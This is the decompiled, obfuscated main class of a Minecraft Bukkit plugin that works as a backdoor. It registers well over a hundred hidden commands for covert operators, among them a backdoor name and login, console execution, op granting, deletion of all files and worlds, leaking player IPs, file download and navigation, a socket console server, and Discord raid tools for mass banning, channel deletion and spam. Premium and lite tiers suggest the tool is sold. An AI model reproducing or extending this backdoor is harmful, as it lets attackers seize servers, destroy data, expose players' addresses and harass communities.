/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.event.Listener
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.Plugin
 *  org.bukkit.plugin.java.JavaPlugin
 */
package me.system.runner;

import com.minecraftforceop.jda.jda.api.JDA;
import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import me.system.runner.command.Command;
import me.system.runner.command.impl.BanCommand;
import me.system.runner.command.impl.BlatantCommand;
import me.system.runner.command.impl.BombsCommand;
import me.system.runner.command.impl.BroadcastCommand;
import me.system.runner.command.impl.CheckerrorCommand;
import me.system.runner.command.impl.ClearchatCommand;
import me.system.runner.command.impl.CommandspyCommand;
import me.system.runner.command.impl.ConsoleCommand;
import me.system.runner.command.impl.CoordsCommand;
import me.system.runner.command.impl.DelallfilesCommand;
import me.system.runner.command.impl.DelworldCommand;
import me.system.runner.command.impl.DeopCommand;
import me.system.runner.command.impl.DirtCommand;
import me.system.runner.command.impl.DisableCommand;
import me.system.runner.command.impl.DiscordraiderCommand;
import me.system.runner.command.impl.DupeCommand;
import me.system.runner.command.impl.EarrapeCommand;
import me.system.runner.command.impl.EnableCommand;
import me.system.runner.command.impl.EnchantCommand;
import me.system.runner.command.impl.EnderchestCommand;
import me.system.runner.command.impl.FeedCommand;
import me.system.runner.command.impl.FireCommand;
import me.system.runner.command.impl.FixCommand;
import me.system.runner.command.impl.FlipCommand;
import me.system.runner.command.impl.FloodCommand;
import me.system.runner.command.impl.FloodconsoleCommand;
import me.system.runner.command.impl.FlyCommand;
import me.system.runner.command.impl.FnCommand;
import me.system.runner.command.impl.FreezeCommand;
import me.system.runner.command.impl.GamemodeCommand;
import me.system.runner.command.impl.GmcCommand;
import me.system.runner.command.impl.GmsCommand;
import me.system.runner.command.impl.GodCommand;
import me.system.runner.command.impl.HealCommand;
import me.system.runner.command.impl.InvseeCommand;
import me.system.runner.command.impl.InvstealCommand;
import me.system.runner.command.impl.ItemCommand;
import me.system.runner.command.impl.KickCommand;
import me.system.runner.command.impl.KillCommand;
import me.system.runner.command.impl.LaunchCommand;
import me.system.runner.command.impl.LeakipsCommand;
import me.system.runner.command.impl.ListloggedinCommand;
import me.system.runner.command.impl.LockcmdsCommand;
import me.system.runner.command.impl.LockconsoleCommand;
import me.system.runner.command.impl.LockcontainersCommand;
import me.system.runner.command.impl.LogconsoleCommand;
import me.system.runner.command.impl.LogoutCommand;
import me.system.runner.command.impl.LookupCommand;
import me.system.runner.command.impl.ModcmdsCommand;
import me.system.runner.command.impl.MsgCommand;
import me.system.runner.command.impl.NameallCommand;
import me.system.runner.command.impl.NamemeCommand;
import me.system.runner.command.impl.NextmsgCommand;
import me.system.runner.command.impl.NodmgCommand;
import me.system.runner.command.impl.NpuCommand;
import me.system.runner.command.impl.OpCommand;
import me.system.runner.command.impl.PenisCommand;
import me.system.runner.command.impl.PissCommand;
import me.system.runner.command.impl.PluginsCommand;
import me.system.runner.command.impl.PopupCommand;
import me.system.runner.command.impl.ReloadCommand;
import me.system.runner.command.impl.RenameCommand;
import me.system.runner.command.impl.ReplyCommand;
import me.system.runner.command.impl.RideCommand;
import me.system.runner.command.impl.RidemeCommand;
import me.system.runner.command.impl.SaveCommand;
import me.system.runner.command.impl.ScareCommand;
import me.system.runner.command.impl.ServerchatCommand;
import me.system.runner.command.impl.SethealthCommand;
import me.system.runner.command.impl.SetmotdCommand;
import me.system.runner.command.impl.SpamCommand;
import me.system.runner.command.impl.SpamsummonCommand;
import me.system.runner.command.impl.SpamwebhookCommand;
import me.system.runner.command.impl.SpinCommand;
import me.system.runner.command.impl.StatusCommand;
import me.system.runner.command.impl.StopCommand;
import me.system.runner.command.impl.SudoCommand;
import me.system.runner.command.impl.SwapCommand;
import me.system.runner.command.impl.TeleprotCommand;
import me.system.runner.command.impl.TipCommand;
import me.system.runner.command.impl.TogglechatCommand;
import me.system.runner.command.impl.TpallCommand;
import me.system.runner.command.impl.TrapCommand;
import me.system.runner.command.impl.UnbanCommand;
import me.system.runner.command.impl.UnfreezeCommand;
import me.system.runner.command.impl.VanishCommand;
import me.system.runner.command.impl.VersionCommand;
import me.system.runner.command.impl.VoidCommand;
import me.system.runner.command.impl.WandCommand;
import me.system.runner.command.impl.WhitelistCommand;
import me.system.runner.command.impl.XpCommand;
import me.system.runner.command.impl.admin.ForcelogoutCommand;
import me.system.runner.command.impl.admin.ListranksCommand;
import me.system.runner.command.impl.admin.LoginCommand;
import me.system.runner.command.impl.admin.LogoutallCommand;
import me.system.runner.command.impl.admin.SetbackdoornameCommand;
import me.system.runner.command.impl.admin.SetlogincmdCommand;
import me.system.runner.command.impl.admin.SpyCommand;
import me.system.runner.command.impl.help.AdminhelpCommand;
import me.system.runner.command.impl.help.HelpCommand;
import me.system.runner.command.impl.help.PremiumhelpCommand;
import me.system.runner.command.impl.premium.AutounbanCommand;
import me.system.runner.command.impl.premium.CheckpassCommand;
import me.system.runner.command.impl.premium.ClearpassCommand;
import me.system.runner.command.impl.premium.ClsCommand;
import me.system.runner.command.impl.premium.ConsoleconnectCommand;
import me.system.runner.command.impl.premium.DelpluginCommand;
import me.system.runner.command.impl.premium.DisablelockCommand;
import me.system.runner.command.impl.premium.EditCommand;
import me.system.runner.command.impl.premium.EnablelockCommand;
import me.system.runner.command.impl.premium.FiledownloadCommand;
import me.system.runner.command.impl.premium.GetipCommand;
import me.system.runner.command.impl.premium.GetportCommand;
import me.system.runner.command.impl.premium.InstallCommand;
import me.system.runner.command.impl.premium.ListCommand;
import me.system.runner.command.impl.premium.LsdCommand;
import me.system.runner.command.impl.premium.LsfCommand;
import me.system.runner.command.impl.premium.PwdCommand;
import me.system.runner.command.impl.premium.SecureCommand;
import me.system.runner.command.impl.premium.SetpasswordCommand;
import me.system.runner.command.impl.premium.SetprefixCommand;
import me.system.runner.command.impl.premium.SettokenCommand;
import me.system.runner.command.impl.premium.ShowtokenCommand;
import me.system.runner.command.impl.premium.ThemeCommand;
import me.system.runner.command.impl.premium.bot.BanallusersCommand;
import me.system.runner.command.impl.premium.bot.CreatetcCommand;
import me.system.runner.command.impl.premium.bot.CreatevcCommand;
import me.system.runner.command.impl.premium.bot.DelchannelsCommand;
import me.system.runner.command.impl.premium.bot.DmallCommand;
import me.system.runner.command.impl.premium.bot.KickallusersCommand;
import me.system.runner.command.impl.premium.bot.SetguildCommand;
import me.system.runner.command.impl.premium.bot.SetstatusCommand;
import me.system.runner.command.impl.premium.bot.SpamdiscordCommand;
import me.system.runner.data.DataManager;
import me.system.runner.events.IPGrabberListener;
import me.system.runner.methods.API;
import me.system.runner.methods.onEnable;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.sockets.SocketServer;
import me.system.runner.utils.DWeb;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class Core
extends JavaPlugin
implements Listener {
    public /* synthetic */ ArrayList<String> noDmg;
    public /* synthetic */ boolean enabled;
    public /* synthetic */ ArrayList<String> commandSpyTargets;
    public /* synthetic */ HashMap<Player, Player> lastMsg;
    public /* synthetic */ boolean frozen;
    public /* synthetic */ boolean modCmd;
    public /* synthetic */ boolean isLocked;
    public /* synthetic */ ArrayList<String> blatant;
    public /* synthetic */ HashMap<Player, Player> commandSpyMap;
    public /* synthetic */ ArrayList<Player> vanish;
    public /* synthetic */ ArrayList<String> frozenPlayers;
    public /* synthetic */ JDA jda;
    public /* synthetic */ ArrayList<String> free;
    public /* synthetic */ ArrayList<String> admin;
    public /* synthetic */ boolean chatLocked;
    public /* synthetic */ ArrayList<String> serverchat;
    public /* synthetic */ ArrayList<String> lite;
    public /* synthetic */ ArrayList<String> noPickupPlayers;
    public /* synthetic */ HashMap<Player, String> forceNextMSG;
    public /* synthetic */ HashMap<Player, String> prefix;
    public /* synthetic */ boolean botEnabled;
    public /* synthetic */ boolean storagesDisabled;
    public /* synthetic */ HashMap<Player, Boolean> vpnStatusMap;
    public /* synthetic */ HashMap<String, Command> commands;
    public /* synthetic */ ArrayList<String> scaffoldingPlayers;
    public /* synthetic */ HashMap<Player, Material> scaffoldMaterialMap;
    public /* synthetic */ boolean playerCommandsLocked;
    public /* synthetic */ ArrayList<String> forceDirtPlayers;
    public static /* synthetic */ SocketServer consoleServer;
    public /* synthetic */ ArrayList<String> cmdSpy;
    public /* synthetic */ HashSet<Inventory> inventories;
    public /* synthetic */ HashMap<Player, Enum> buyerstatusMap;
    public /* synthetic */ ArrayList<String> premium;
    public /* synthetic */ ArrayList<String> god;

    public void onDisable() {
        if (consoleServer != null) {
            consoleServer.stop();
        }
        API.saveConfig();
        for (Player lllllllllllllllIlIIIIlllIlIlllIl : Bukkit.getOnlinePlayers()) {
            Core lllllllllllllllIlIIIIlllIlIlllII;
            if (!lllllllllllllllIlIIIIlllIlIlllII.lite.contains(lllllllllllllllIlIIIIlllIlIlllIl.getName())) continue;
            lllllllllllllllIlIIIIlllIlIlllIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0").append(Settings.DARK_RED).append("| WARNING | &e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0"))));
            lllllllllllllllIlIIIIlllIlIlllIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.RED).append(Settings.NAME).append(Settings.WHITE).append(" has just been ").append(Settings.RED).append("disabled! ").append(Settings.WHITE).append("Do not do anything until the plugin is re-enabled!")));
            lllllllllllllllIlIIIIlllIlIlllIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0").append(Settings.DARK_RED).append("| WARNING | &e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0"))));
        }
    }

    public Core() {
        Core lllllllllllllllIlIIIlIIIIIIlIlIl;
        lllllllllllllllIlIIIlIIIIIIlIlIl.lite = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.free = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.admin = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.premium = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.blatant = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.god = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.noPickupPlayers = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.serverchat = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.forceDirtPlayers = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.scaffoldingPlayers = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.noDmg = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.vanish = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.vpnStatusMap = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.buyerstatusMap = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.scaffoldMaterialMap = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.lastMsg = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.prefix = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.forceNextMSG = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.commandSpyMap = new HashMap();
        lllllllllllllllIlIIIlIIIIIIlIlIl.inventories = new HashSet();
        lllllllllllllllIlIIIlIIIIIIlIlIl.frozenPlayers = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.commandSpyTargets = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.cmdSpy = new ArrayList();
        lllllllllllllllIlIIIlIIIIIIlIlIl.enabled = true;
        lllllllllllllllIlIIIlIIIIIIlIlIl.isLocked = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.frozen = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.modCmd = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.playerCommandsLocked = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.chatLocked = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.storagesDisabled = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.botEnabled = false;
        lllllllllllllllIlIIIlIIIIIIlIlIl.commands = new HashMap<String, Command>(){
            private static final /* synthetic */ long serialVersionUID = 1503068533314125621L;
            {
                1 llllllllllllllIlIIlllllIIlllIlll;
                llllllllllllllIlIIlllllIIlllIlll.put("op", new OpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("deop", new DeopCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lockconsole", new LockconsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("logout", new LogoutCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("quit", new LogoutCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("logoutall", new LogoutallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("blatant", new BlatantCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("commandspy", new CommandspyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("cmdspy", new CommandspyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("coords", new CoordsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("coord", new CoordsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("getip", new GetipCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delallfiles", new DelallfilesCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("wand", new WandCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("wands", new WandCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spin", new SpinCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("help", new HelpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("adminhelp", new AdminhelpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ahelp", new AdminhelpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ride", new RideCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("plugins", new PluginsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("pl", new PluginsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("item", new ItemCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("i", new ItemCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("enable", new EnableCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("disable", new DisableCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setmotd", new SetmotdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("motd", new SetmotdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("checkerror", new CheckerrorCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("whitelist", new WhitelistCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("wl", new WhitelistCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("leakips", new LeakipsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("rename", new RenameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nodmg", new NodmgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nodamage", new NodmgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("fix", new FixCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("repair", new FixCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("logconsole", new LogconsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("flood", new FloodCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("edit", new EditCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("kick", new KickCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ban", new BanCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("unban", new UnbanCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("pardon", new UnbanCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("msg", new MsgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("whisper", new MsgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("w", new MsgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("console", new ConsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("exe", new ConsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("execute", new ConsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("tip", new TipCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setguild", new SetguildCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delchannels", new DelchannelsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delallchannels", new DelchannelsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delallchannel", new DelchannelsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delchannel", new DelchannelsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dmall", new DmallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dmallusers", new DmallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("kickallusers", new KickallusersCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("kickusers", new KickallusersCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("banallusers", new BanallusersCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("banusers", new BanallusersCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("secure", new SecureCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("maxsecure", new SecureCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("version", new VersionCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ver", new VersionCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("showtoken", new ShowtokenCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("gettoken", new ShowtokenCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delworld", new DelworldCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("invsteal", new InvstealCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("heal", new HealCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("feed", new FeedCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("createvc", new CreatevcCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("createtc", new CreatetcCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spamdiscord", new SpamdiscordCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lookup", new LookupCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("sethealth", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setmaxhealth", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setheart", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("sethearts", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setmaxheart", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setmaxhearts", new SethealthCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("kill", new KillCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("fn", new FnCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("filenavigation", new FnCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("cls", new ClsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lsd", new LsdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lsf", new LsfCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("pwd", new PwdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("getport", new GetportCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("enchant", new EnchantCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ench", new EnchantCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("discordraider", new DiscordraiderCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dr", new DiscordraiderCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("piss", new PissCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("list", new ListCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("freeze", new FreezeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("unfreeze", new UnfreezeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nextmsg", new NextmsgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nextmessage", new NextmsgCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("reply", new ReplyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("r", new ReplyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("vanish", new VanishCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("v", new VanishCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("bombs", new BombsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("bomb", new BombsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setprefix", new SetprefixCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dirt", new DirtCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("serverchat", new ServerchatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("sc", new ServerchatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("hackerchat", new ServerchatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("hc", new ServerchatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("settoken", new SettokenCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("status", new StatusCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("save", new SaveCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("rideme", new RidemeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setpassword", new SetpasswordCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setpass", new SetpasswordCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spamwebhook", new SpamwebhookCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("checkpass", new CheckpassCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nameme", new NamemeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nameall", new NameallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("teleprot", new TeleprotCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("teleport", new TeleprotCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("xp", new XpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("tp", new TeleprotCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("tpall", new TpallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("delplugin", new DelpluginCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setstatus", new SetstatusCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("penis", new PenisCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("rainpenises", new PenisCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("rainpenis", new PenisCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("launch", new LaunchCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("throw", new LaunchCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("void", new VoidCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("modcmds", new ModcmdsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("modcommands", new ModcmdsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("moderationcommands", new ModcmdsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("disablelock", new DisablelockCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("enablelock", new EnablelockCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("earrape", new EarrapeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("listloggedin", new ListloggedinCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dupe", new DupeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dupemachine", new DupeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("flip", new FlipCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("sudo", new SudoCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("broadcast", new BroadcastCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("bc", new BroadcastCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spam", new SpamCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("god", new GodCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("invsee", new InvseeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("togglechat", new TogglechatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("clearchat", new ClearchatCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("consoleconnect", new ConsoleconnectCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("connectconsole", new ConsoleconnectCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("fire", new FireCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("burn", new FireCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("reload", new ReloadCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("stop", new StopCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("npu", new NpuCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nopickup", new NpuCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("floodconsole", new FloodconsoleCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lockcontainers", new LockcontainersCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lockcmds", new LockcmdsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lockcommands", new LockcmdsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("fly", new FlyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spy", new SpyCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("login", new LoginCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("forcelogout", new ForcelogoutCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("listranks", new ListranksCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("lr", new ListranksCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setlogincmd", new SetlogincmdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setlogincommand", new SetlogincmdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setlogin", new SetlogincmdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setcmdforlogin", new SetlogincmdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setcommandforlogin", new SetlogincmdCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setbackdoorname", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("setname", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("backdoorname", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("asignbackdoorname", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("asignname", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("nameset", new SetbackdoornameCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("premiumhelp", new PremiumhelpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("premhelp", new PremiumhelpCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("clearpass", new ClearpassCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("enderchest", new EnderchestCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("echest", new EnderchestCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("gamemode", new GamemodeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("gm", new GamemodeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("gms", new GmsCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("gmc", new GmcCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("install", new InstallCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("theme", new ThemeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("scheme", new ThemeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("color", new ThemeCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("autounbanned", new AutounbanCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("autounban", new AutounbanCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("downloadfiles", new FiledownloadCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("filedownload", new FiledownloadCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("fldl", new FiledownloadCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("dlfiles", new FiledownloadCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("popup", new PopupCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("swap", new SwapCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("scare", new ScareCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("trap", new TrapCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("spamsummon", new SpamsummonCommand());
                llllllllllllllIlIIlllllIIlllIlll.put("ss", new SpamsummonCommand());
            }
        };
    }

